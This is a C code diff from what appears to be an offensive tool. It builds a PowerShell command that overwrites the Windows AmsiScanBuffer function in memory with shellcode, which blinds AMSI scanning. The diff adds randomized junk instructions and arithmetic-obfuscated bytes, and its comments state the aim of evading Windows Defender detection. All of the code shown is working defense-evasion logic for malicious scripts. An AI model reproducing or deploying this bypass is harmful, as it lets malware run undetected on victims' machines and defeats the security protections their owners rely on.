@@ -97,17 +97,46 @@ LPWSTR GetPowershellCommand()
 		);
 
 		// Overwrite AmsiScanBuffer function with shellcode to return AMSI_RESULT_CLEAN.
+		// Intermingle shellcode with dummy (no-op like) instructions to evade Windows Defender detection of AmsiScanBuffer overwrites.
 		if (Is64BitOperatingSystem())
 		{
 			// b8 57 00 07 80	mov		eax, 0x80070057
 			// c3				ret
-			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc3),0,$AmsiScanBufferPtr,6);");
+			DWORD shellCodeSize = 6;
+
+			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L",");
+			WriteShellCodeBytes(command, "\xb8\x57\x00\x07\x80", 5);
+			StrCatW(command, L",");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L",");
+			WriteShellCodeBytes(command, "\xc3", 1);
+			StrCatW(command, L",");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L"),0,$AmsiScanBufferPtr,");
+			WriteObfuscatedNumber(command, shellCodeSize);
+			StrCatW(command, L");");
 		}
 		else
 		{
 			// b8 57 00 07 80	mov		eax, 0x80070057
 			// c2 18 00			ret		0x18
-			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc2,0x18,0),0,$AmsiScanBufferPtr,8);");
+			DWORD shellCodeSize = 8;
+
+			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L",");
+			WriteShellCodeBytes(command, "\xb8\x57\x00\x07\x80", 5);
+			StrCatW(command, L",");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L",");
+			WriteShellCodeBytes(command, "\xc2\x18\x00", 3);
+			StrCatW(command, L",");
+			shellCodeSize += WriteDummyShellCodeBytes(command);
+			StrCatW(command, L"),0,$AmsiScanBufferPtr,");
+			WriteObfuscatedNumber(command, shellCodeSize);
+			StrCatW(command, L");");
 		}
 
 		// VirtualProtect PAGE_EXECUTE_READ
@@ -251,4 +280,83 @@ VOID ObfuscatePowershellStringLiterals(LPWSTR command)
 	StrCpyW(command, newCommand);
 	FREE(newCommand);
 	FREE(random);
+}
+VOID WriteShellCodeBytes(LPWSTR command, LPBYTE shellCode, DWORD size)
+{
+	// Write shellcode bytes:
+	//  - Each byte is obfuscated using a simple addition or subtraction.
+	//    e.g.: 0xab -> [Byte](0x12+0x99)
+
+	for (DWORD i = 0; i < size; i++)
+	{
+		StrCatW(command, L"[Byte](");
+		WriteObfuscatedNumber(command, shellCode[i]);
+		StrCatW(command, L")");
+
+		if (i < size - 1)
+		{
+			StrCatW(command, L",");
+		}
+	}
+}
+DWORD WriteDummyShellCodeBytes(LPWSTR command)
+{
+	BYTE rand[1];
+	GetRandomBytes(rand, 1);
+
+	LPCSTR shellCode = "";
+	DWORD size = 0;
+
+	switch (rand[0] & 7)
+	{
+		// These shellcodes are equal in x64 and x86 mode.
+		case 0:
+			shellCode = "\x89\xc0"; // mov eax, eax
+			size = 2;
+			break;
+		case 1:
+			shellCode = "\x89\xdb"; // mov ebx, ebx
+			size = 2;
+			break;
+		case 2:
+			shellCode = "\x89\xc9"; // mov ecx, ecx
+			size = 2;
+			break;
+		case 3:
+			shellCode = "\x89\xd2"; // mov edx, edx
+			size = 2;
+			break;
+		case 4:
+			shellCode = "\x83\xc0\x00"; // add eax, 0
+			size = 3;
+			break;
+		case 5:
+			shellCode = "\x83\xeb\x00"; // sub ebx, 0
+			size = 3;
+			break;
+		case 6:
+			shellCode = "\x83\xc1\x00"; // add ecx, 0
+			size = 3;
+			break;
+		case 7:
+			shellCode = "\x83\xea\x00"; // sub edx, 0
+			size = 3;
+			break;
+	}
+
+	WriteShellCodeBytes(command, shellCode, size);
+	return size;
+}
+VOID WriteObfuscatedNumber(LPWSTR command, DWORD number)
+{
+	BYTE rand[1];
+	GetRandomBytes(rand, 1);
+
+	INT a = rand[0];
+	INT b = number - a;
+
+	WCHAR buffer[10];
+	StrCatW(command, Int32ToStrW(a, buffer));
+	StrCatW(command, b >= 0 ? L"+" : L"-");
+	StrCatW(command, Int32ToStrW(b > 0 ? b : -b, buffer));
 }
